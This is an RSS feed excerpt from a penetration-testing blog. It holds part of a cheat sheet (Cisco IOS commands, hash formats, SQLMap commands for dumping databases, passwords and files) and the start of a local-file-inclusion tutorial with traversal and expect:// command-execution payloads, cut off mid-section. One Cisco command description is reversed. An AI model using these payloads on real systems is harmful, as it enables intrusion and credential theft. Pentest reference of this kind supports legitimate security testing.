        &lt;p&gt;&lt;code&gt;(config-line)# password YOUR-PASSWORD&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Set telnet password&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show running-config&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show running config loaded in memory&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show startup-config&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show sartup config&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show version&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;show cisco IOS version&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show session&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;display open sessions&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show ip interface&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show network interfaces&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show interface e0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show detailed interface info&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show ip route&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show routes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# show access-lists&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show access lists&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# dir file systems&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show available files&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# dir all-filesystems&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;File information&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# dir /all&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;SHow deleted files&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# terminal length 0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;No limit on terminal output&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# copy running-config tftp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copys running config to tftp server&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;# copy running-config startup-config&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy startup-config to running-config&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h2&gt;

&lt;h3 id=&quot;hash-lengths&quot;&gt;Hash Lengths&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Hash&lt;/th&gt;
      &lt;th&gt;Size&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;MD5 Hash Length&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;16 Bytes&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-1 Hash Length&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;20 Bytes&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-256 Hash Length&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;32 Bytes&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-512 Hash Length&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;64 Bytes&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;hash-examples&quot;&gt;Hash Examples&lt;/h3&gt;

&lt;p&gt;Likely just use &lt;strong&gt;hash-identifier&lt;/strong&gt; for this but here are some example hashes:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Hash&lt;/th&gt;
      &lt;th&gt;Example&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;MD5 Hash Example&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;8743b52063cd84097a65d1633f5c74f5&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;MD5 $PASS:$SALT Example&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;01dfae6e5d4d90d9892622325959afbe:7050461&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;MD5 $SALT:$PASS&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;f0fda58630310a6dd91a7d8f0a4ceda2:4225637426&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA1 Hash Example&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;b89eaac7e61417341b710b727768294d0e6a277b&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA1 $PASS:$SALT&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;2fc5a684737ce1bf7b3b239df432416e0dd07357:2014&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA1 $SALT:$PASS&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-256&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;127e6fbfe24a750e72930c220a8e138275656b&lt;br /&gt;8e5d8f48a98c3c92df2caba935&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-256 $PASS:$SALT&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;c73d08de890479518ed60cf670d17faa26a4a7&lt;br /&gt;1f995c1dcc978165399401a6c4&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-256 $SALT:$PASS&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;eb368a2dfd38b405f014118c7d9747fcc97f4&lt;br /&gt;f0ee75c05963cd9da6ee65ef498:560407001617&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-512&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;82a9dda829eb7f8ffe9fbe49e45d47d2dad9&lt;br /&gt;664fbb7adf72492e3c81ebd3e29134d9bc&lt;br /&gt;12212bf83c6840f10e8246b9db54a4&lt;br /&gt;859b7ccd0123d86e5872c1e5082f&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-512 $PASS:$SALT&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;e5c3ede3e49fb86592fb03f471c35ba13e8&lt;br /&gt;d89b8ab65142c9a8fdafb635fa2223c24e5&lt;br /&gt;558fd9313e8995019dcbec1fb58414&lt;br /&gt;6b7bb12685c7765fc8c0d51379fd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;SHA-512 $SALT:$PASS&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;976b451818634a1e2acba682da3fd6ef&lt;br /&gt;a72adf8a7a08d7939550c244b237c72c7d4236754&lt;br /&gt;4e826c0c83fe5c02f97c0373b6b1&lt;br /&gt;386cc794bf0d21d2df01bb9c08a&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;NTLM Hash Example&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;b4b9b02e6f09a9bd760f388b67351e2b&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;sqlmap-examples&quot;&gt;SQLMap Examples&lt;/h2&gt;

&lt;p&gt;A mini SQLMap cheat sheet:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;sqlmap -u http://meh.com --forms --batch --crawl=10 &lt;br /&gt; --cookie=jsessionid=54321 --level=5 --risk=3&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Automated sqlmap scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt; sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE &lt;br /&gt; --level=3 --current-user --current-db --passwords &lt;br /&gt; --file-read=&quot;/var/www/blah.php&quot; &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Targeted sqlmap scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; &lt;br /&gt;--dbms=mysql --tech=U --random-agent --dump &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scan url for union + error based injection with mysql backend &lt;br /&gt;and use a random user agent + database dump&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;sqlmap -o -u &quot;http://meh.com/form/&quot; --forms&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;sqlmap check form for injection&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms &lt;br /&gt; -D database-name -T users --dump&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;sqlmap dump and crack hashes for table users on database-name.&lt;/p&gt;
      &lt;/td&gt;
     &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LFI Cheat Sheet</title>
          <link>https://highon.coffee/blog/lfi-cheat-sheet/</link>
          <pubDate>Sun, 24 Apr 2016 11:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>LFI</category>
          
          <category>Web Application Penetration Testing</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lfi-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-an-lfi-vulnerability&quot; id=&quot;markdown-toc-what-is-an-lfi-vulnerability&quot;&gt;What is an LFI Vulnerability?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-to-get-a-shell-from-lfi&quot; id=&quot;markdown-toc-how-to-get-a-shell-from-lfi&quot;&gt;How to get a Shell from LFI&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#path-traversal-aka-directory-traversal&quot; id=&quot;markdown-toc-path-traversal-aka-directory-traversal&quot;&gt;Path Traversal aka Directory Traversal&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#php-wrapper-expect-lfi&quot; id=&quot;markdown-toc-php-wrapper-expect-lfi&quot;&gt;PHP Wrapper expect:// LFI&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#php-wrapper-phpfile&quot; id=&quot;markdown-toc-php-wrapper-phpfile&quot;&gt;PHP Wrapper php://file&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#php-wrapper-phpfilter&quot; id=&quot;markdown-toc-php-wrapper-phpfilter&quot;&gt;PHP Wrapper php://filter&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#procselfenviron-lfi-method&quot; id=&quot;markdown-toc-procselfenviron-lfi-method&quot;&gt;/proc/self/environ LFI Method&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#procselffd-lfi-method&quot; id=&quot;markdown-toc-procselffd-lfi-method&quot;&gt;/proc/self/fd/ LFI Method&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#fimap-lfi-pen-testing-tool&quot; id=&quot;markdown-toc-fimap-lfi-pen-testing-tool&quot;&gt;fimap LFI Pen Testing Tool&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#fimap--phpinfo-exploit&quot; id=&quot;markdown-toc-fimap--phpinfo-exploit&quot;&gt;fimap + phpinfo() Exploit&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-an-lfi-vulnerability&quot;&gt;What is an LFI Vulnerability?&lt;/h2&gt;

&lt;p&gt;LFI stands for &lt;strong&gt;Local File Includes&lt;/strong&gt; - it’s a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically this is exploited by abusing dynamic file inclusion mechanisms that don’t sanitize user input.&lt;/p&gt;

&lt;!--more--&gt;
&lt;p&gt;Scripts that take filenames as parameters without sanitizing the user input are good candidates for LFI vulnerabilities, a good example would be the following PHP script &lt;code&gt;foo.php?file=image.jpg&lt;/code&gt; which takes &lt;code&gt;image.jpg&lt;/code&gt; as a parameter.  An attacker would simply replace &lt;code&gt;image.jpg&lt;/code&gt; and insert a payload. Normally a directory traversal payload is used that escapes the script directory and traverses the filesystem directory structure, exposing sensitive files such as &lt;code&gt;foo.php?file=../../../../../../../etc/passwd&lt;/code&gt; or sensitive files within the web application itself. Exposing sensitive information or configuration files containing SQL usernames and passwords.&lt;/p&gt;

&lt;p&gt;Note: In some cases, depending on the nature of the LFI vulnerability it’s possible to run system executables.&lt;/p&gt;

&lt;h2 id=&quot;how-to-get-a-shell-from-lfi&quot;&gt;How to get a Shell from LFI&lt;/h2&gt;

&lt;p&gt;Below are some techniques I’ve used in the past to gain a shell on systems with vulnerable LFI scripts exposed.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;path-traversal-aka-directory-traversal&quot;&gt;Path Traversal aka Directory Traversal&lt;/h3&gt;

&lt;p&gt;As mentioned above Traverse the filesystem directory structure to disclose sensitive information about the system that can help you gain a shell, usernames / passwords etc.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;php-wrapper-expect-lfi&quot;&gt;PHP Wrapper expect:// LFI&lt;/h3&gt;

&lt;p&gt;Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.&lt;/p&gt;

&lt;p&gt;An example of PHP expect:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://127.0.0.1/fileincl/example1.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;expect://ls&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Below is the error received if the PHP expect wrapper is disabled:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nc&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Unable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapper&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;expect&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;did&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forget&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;configured&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileincl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example1&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Unable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapper&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;expect&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;did&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forget&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;configured&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileincl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example1&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;://&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;failed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;such&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;directory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileincl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example1&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Failed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opening&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'expect://ls'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inclusion&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.:/usr/share/php:/usr/share/pear'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileincl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example1&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;php-wrapper-phpfile&quot;&gt;PHP Wrapper php://file&lt;/h3&gt;

&lt;p&gt;Another PHP wrapper, &lt;code&gt;php://input&lt;/code&gt; your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png&quot; alt=&quot;LFI php://file hackbar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

